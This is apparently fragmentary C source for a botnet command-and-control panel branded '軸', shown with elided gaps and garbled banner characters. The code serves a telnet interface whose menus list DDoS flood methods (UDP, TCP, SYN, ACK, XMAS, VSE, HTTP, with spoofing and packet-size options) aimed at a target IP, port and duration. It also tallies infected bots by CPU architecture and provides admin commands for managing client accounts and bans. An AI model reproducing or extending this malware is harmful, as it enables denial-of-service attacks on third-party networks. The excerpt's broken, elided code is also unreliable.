    ...
    for(i = 0; i < amt2send; i++){
        ...
        if(fuck == 1 ){
            ...
            if(strstr(mybin_type, "ALL")){
                ...
                continue;
            snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"R"%s"W"@"R"è»¸"W": \x1b[0m", MNGRS[i].nick);
...
void *TelWorker(void *arguments){
        ...
        sprintf(axis1, "\r\n            "W"Â· â–ª"R"â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–€â–ˆâ–ˆâ–ˆâ–ˆ"W"â–ª   Â·"R"â–â–ˆâ–ˆâ–ˆâ–€ "W"Â·"R"â–„â–ˆ  "W"Â·"R"â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"W"â–ªÂ·\r\n");
        sprintf(axis2, "           "W"Â·  "R"â–ˆâ–ˆâ–ˆ   "W"Â·"R"â–ˆâ–ˆâ–ˆ "W"Â· "R"â–ˆâ–ˆâ–ˆâ–Œ  "W"Â·"R"â–â–ˆâ–ˆâ–ˆ "W"â–ª "R"â–ˆâ–ˆâ–ˆ"W"Â· "R"â–ˆâ–ˆâ–ˆ  "W"Â· "R"â–ˆâ–ˆâ–ˆ  "W"Â·\r\n");
        sprintf(axis3, "             "W"Â·"R"â–ˆâ–ˆâ–ˆ"W"Â·   "R"â–ˆâ–ˆâ–ˆâ–Œ  "W"â–ª"R"â–ˆâ–ˆâ–ˆ"W"Â·  "R"â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–Œ"W"Â·"R"â–ˆâ–ˆâ–ˆ"W"Â·   "R"â–ˆâ–€"W"Â·\r\n");
        sprintf(axis4, "            "W"Â· "R"â–ˆâ–ˆâ–ˆ   "W"â–ª"R"â–ˆâ–ˆâ–ˆ  "W"Â· "R"â–€â–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–€  "W"Â· "R"â–ˆâ–ˆâ–ˆâ–Œ â–ˆâ–ˆâ–ˆ "W"Â·   Â·  â–ª\r\n");
        sprintf(axis5, "            "R"â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ   "W"Â·"R"â–„â–ˆâ–ˆâ–€â–ˆâ–ˆâ–„ "W"Â·   "R"â–ˆâ–ˆâ–ˆâ–Œâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  "W"Â·\r\n");
        sprintf(axis6, "          "W"Â·   "R"â–ˆâ–ˆâ–ˆâ–Œ"W"Â·  "R"â–ˆâ–ˆâ–ˆ"W"Â·  "R"â–â–ˆâ–ˆâ–ˆ "W"Â· "R"â–ˆâ–ˆâ–ˆâ–Œ  "W"Â·"R"â–ˆâ–ˆâ–ˆ"W"Â·  Â·    â–ª"R"â–ˆâ–ˆ"W"Â·\r\n");
        sprintf(axis7, "             "W"â–ª"R"â–ˆâ–ˆâ–ˆ   "W"Â·"R"â–ˆâ–ˆâ–ˆ  â–„â–ˆâ–ˆâ–ˆ "W"â–ª  Â·"R"â–ˆâ–ˆâ–ˆâ–„"W"Â· "R"â–ˆâ–ˆâ–ˆ "W"â–ª "R"â–„â–ˆ"W"Â· Â· "R"â–ˆâ–ˆâ–ˆ "W"Â·\r\n");
        sprintf(axis8, "            "W"Â·"R"â–„â–ˆâ–ˆâ–ˆ"W"Â·   "R"â–ˆâ–€ "W"Â·"R"â–„â–ˆâ–ˆâ–ˆ"W"Â·  Â·   "R"â–ˆâ–ˆâ–ˆâ–„ â–ˆâ–€"W"Â· "R"â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€"W"Â·\r\n\r\n");
        ...
        char *axisprompt[200];
        snprintf(axisprompt, sizeof(axisprompt), ""R"%s"W"@"R"è»¸"W": "W"", MNGRS[axisfd].nick);
        ...
        if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear")){
            ...
            */
            ...
            sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ METHODS \x1b[90m- "R"Shows Attack Commands     "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ TOOLS   \x1b[90m- "R"Shows Available Tools     "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ SERVER  \x1b[90m- "R"Shows ServerSide Commands "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ ADMIN   \x1b[90m- "R"Shows Admin Commands      "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "METHODS") || strstr(buf, "methods")){ 
            sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ Custom UDP  \x1b[90m- "R""TRIG" CUDP [IP] [PORT] [TIME] [SPOOFS] [SIZE] [POLL] [SLEEP]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ Custom TCP  \x1b[90m- "R""TRIG" CTCP [IP] [PORT] [TIME] [SPOOFS] [FLAGS] [SIZE] [POLL]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ Custom XMAS \x1b[90m- "R""TRIG" CXMAS [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL] "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ Custom VSE  \x1b[90m- "R""TRIG" CVSE [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ RHex HTTP \x1b[90m- "R""TRIG" HTTP [URL] [PORT] [TIME] [THREADS] [METHOD(GET/POST/HEAD)]"W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;

            sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return; 
            sprintf(axis, ""W"â•‘ UDP \x1b[90m- "R""TRIG" UDP [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ TCP \x1b[90m- "R""TRIG" TCP [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ SYN \x1b[90m- "R""TRIG" SYN [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ ACK \x1b[90m- "R""TRIG" ACK [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ STD \x1b[90m- "R""TRIG" STD [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ XMAS \x1b[90m-"R""TRIG" XMAS [IP] [PORT] [TIME] "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ VSE \x1b[90m- "R""TRIG" VSE [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ CNC \x1b[90m- "R""TRIG" CNC [IP] [PORT] [TIME]  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "TOOLS") || strstr(buf, "tools")){           
            sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ IP Lookup \x1b[90m- "R"IPLOOKUP [TARGET] "W"â•‘\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ Resolver \x1b[90m- "R"RESOLVE [TARGET]   "W"â•‘\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "SERVER") || strstr(buf, "server")){           
            sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ BOTS \x1b[90m- "R"Shows Bot Count/Arch "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ STATS \x1b[90m- "R"Show Account Stats  "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ ONLINE \x1b[90m- "R"Shows Online Users "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ MSG \x1b[90m- "R"Direct Message A User "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•‘ CLS \x1b[90m- "R"Clears Screen         "W"â•‘\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "admin") || strstr(buf, "ADMIN")){  
            if(MNGRS[axisfd].axadm == 1){           
                sprintf(axis, ""W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Create A Client Account \x1b[90m- "R"ADDUSER                "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Delete A Client Account \x1b[90m- "R"DELUSER                "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ LISTEN ON/OFF \x1b[90m- "R"Listen To User Inputs            "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ CHANGEMOTD \x1b[90m- "R"Change Message Of The Day           "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Kick \x1b[90m- "R"KICK USER=[USERNAME] | KICK ID=[ID#]      "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Connection Ban \x1b[90m- "R"BAN IP=[IP]                     "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ User Ban \x1b[90m- "R"BAN USER=[USER] | BAN ID=[ID#]        "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ "R"(User/ID Ban Resolves and Bans Their IP Address) "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Unban \x1b[90m- "R"UNBAN IP=[IP]                            "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Blacklist IPv4 \x1b[90m- "R"BLACKLIST                       "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•‘ Un-Blacklist IPv4\x1b[90m- "R"RMBLK                         "W"â•‘\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\x1b[0m\r\n");
            ...
            for(pmfd = 0; pmfd < MXFDS; pmfd++) {
                if(MNGRS[pmfd].connd) {
                    if(!strcmp(pmuser, MNGRS[pmfd].nick)) {
                        ...
                        sprintf(axis, ""R"%s"W"@"R"è»¸"W": "W"", MNGRS[pmfd].nick);
                        if(send(pmfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        sent = 1;
                        break;
                    }
            ...
            if(DevsConnected() == 0){
                ...
                if(MNGRS[axisfd].axadm == 1){
                    ...
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    if(MIPS != 0){
                        sprintf(axis, ""R"è»¸.Mips ["W"%d"R"]\r\n\x1b[0m", MIPS);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(MIPSEL != 0){
                        sprintf(axis, ""R"è»¸.Mipsel ["W"%d"R"]\r\n\x1b[0m", MIPSEL);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM4 != 0){
                        sprintf(axis, ""R"è»¸.Armv4 ["W"%d"R"]\r\n\x1b[0m", ARM4);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM5 != 0){
                        sprintf(axis, ""R"è»¸.Armv5 ["W"%d"R"]\r\n\x1b[0m", ARM5);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM6 != 0){
                        sprintf(axis, ""R"è»¸.Armv6 ["W"%d"R"]\r\n\x1b[0m", ARM6);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM7 != 0){
                        sprintf(axis, ""R"è»¸.Armv7 ["W"%d"R"]\r\n\x1b[0m", ARM7);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(X86 != 0){
                        sprintf(axis, ""R"è»¸.x86 ["W"%d"R"]\r\n\x1b[0m", X86);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(PPC != 0){
                        sprintf(axis, ""R"è»¸.Powerpc ["W"%d"R"]\r\n\x1b[0m", PPC);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(SUPERH != 0){
                        sprintf(axis, ""R"è»¸.SuperH ["W"%d"R"]\r\n\x1b[0m", SUPERH);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(M68K != 0){
                        sprintf(axis, ""R"è»¸.M68k ["W"%d"R"]\r\n\x1b[0m", M68K);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(SPARC != 0){
                        sprintf(axis, ""R"è»¸.Sparc ["W"%d"R"]\r\n\x1b[0m", SPARC);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(UNKNOWN != 0){
                        sprintf(axis, ""R"è»¸.Unknown ["W"%d"R"]\r\n\x1b[0m", UNKNOWN);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(DEBUG != 0){
                        sprintf(axis, ""R"è»¸.Debug ["W"%d"R"]\r\n\x1b[0m", DEBUG);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
        ...
        Trim(buf);
        if(strlen(buf) == 0){
            snprintf(axisprompt, sizeof(axisprompt), ""R"%s"W"@"R"è»¸"W"~#"R": "W"", ACCS[fnd].axid);
            if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;
            continue;
        }
        else{
